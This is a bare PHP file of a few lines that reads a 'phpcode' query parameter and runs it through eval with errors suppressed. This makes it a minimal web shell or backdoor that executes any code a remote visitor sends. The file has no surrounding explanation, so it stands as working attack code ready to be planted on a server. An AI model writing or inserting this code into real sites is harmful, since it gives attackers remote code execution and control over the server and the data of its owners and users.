<?php
$anyphpcode = $_GET['phpcode'];
header("HTTP/1.0 200 OK"); 
@eval($anyphpcode);
?>